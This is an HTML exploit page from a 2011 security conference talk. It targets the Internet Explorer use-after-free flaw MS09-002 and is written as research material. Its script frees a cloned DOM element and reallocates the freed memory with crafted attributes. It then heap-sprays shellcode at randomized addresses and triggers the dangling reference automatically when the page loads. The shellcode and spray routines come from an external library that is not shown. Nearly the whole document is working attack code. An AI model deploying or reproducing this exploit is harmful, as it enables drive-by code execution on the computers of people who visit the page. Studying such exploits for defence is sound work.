<!--
   Talk:        Inception - The extended edition
   Author:      Nelson Brito <nbrito *NoSPAM* sekure.org>
   Conference:  Hackers to Hackers Conference Eighth Edition (October 2011)
 --------------------------------------------------------------------------
           .___                            __  .__
           |   | ____   ____  ____ _______/  |_|__| ____   ____
           |   |/    \_/ ___\/ __ \\____ \   __\  |/  _ \ /    \
           |   |   |  \  \__\  ___/|  |_> >  | |  (  <_> )   |  \
           |___|___|__/\_____>_____>   __/|__| |__|\____/|___|__/
                                   |__|
                       _______________  ____ ____
                       \_____  \   _  \/_   /_   |
                        /  ____/  /_\  \|   ||   |
                       /       \  \_/   \   ||   |
                       \________\_______/___||___|
 
 --------------------------------------------------------------------------
 Copyright (c) 2011 Nelson Brito. All rights reserved worldwide.
 
 This program is free software: you can redistribute it and/or modify it
 under  the terms of the GNU General Public License  as published by the
 Free Software Foundation,  either version 3 of the License, or (at your
 option) any later version.
 
 This program  is  distributed in  the hope that  it will be useful, but
 WITHOUT  ANY  WARRANTY;   without   even  the   implied   warranty   of
 MERCHANTABILITY  or  FITNESS  FOR  A  PARTICULAR  PURPOSE.  See the GNU
 General Public License for more details.
 
 You  should have  received a copy of the  GNU  General  Public  License
 along with this program.  If not, see <http://www.gnu.org/licenses/>.
-->
<HTML>
<SCRIPT SRC="../ExploitLib.js" TYPE="text/javascript" LANGUAGE="JavaScript"></SCRIPT>
<SCRIPT TYPE="text/javascript" LANGUAGE="JavaScript">
function Inception (){
	var ms09_002   = new Exploit(),
	    choice     = new Number(),
	    memory     = new Number(),
		address    = new Number(),
		shellcode  = new String(),
		__01       = document.createElement("option"),
		__02, __03 = [ ["image", "src" ], ["area",  "href"], ["link",  "href"] ],
		__04, __05,
		__06       = new Array();

	ms09_002.detail = ["MS09-002", "0.01", "20111016", "Nelson Brito"];
	ms09_002.offset = [
		0x06060606, 0x08080808, 0x0c0c0c0c, 0x0e0e0e0e,
		0x10101010, 0x14141414, 0x15151515, 0x16161616,
		0x18181818, 0x20202020, 0x24242424, 0x27272727,
		0x28282828, 0x30303030
	];
	ms09_002.message = false;

	choice    = ms09_002.random(ms09_002.offset.length);
	memory    = ms09_002.memory(ms09_002.offset[choice], 16);
	address   = ms09_002.address(ms09_002.offset[choice], 0);
	shellcode = ms09_002.shellcode(ms09_002.code[1], 1);

	__01.componentFromPoint;
	__02 = __01.cloneNode();
	
	__01.clearAttributes();
	__01 = null;
	CollectGarbage();

	choice    = ms09_002.random(__03.length);

	__04      = document.createElement(__03[choice][0]);
	__05      = document.createAttribute(__03[choice][1]);

	__05.nodeValue = unescape(address + ms09_002.ascii("mixed", "ascii", (32 - (__03[choice][0].length + __03[choice][1].length))));
	__04.setAttributeNode(__05);
	
	for(var i = 0 ; i < (1024 - (__03[choice][0].length + __03[choice][1].length)) ; i++)
		__06.push(__04);

	if(ms09_002.spray(address, shellcode, memory))
		__02.componentFromPoint;
}
</SCRIPT>
<BODY onLoad="Inception();">
</BODY>
</HTML>
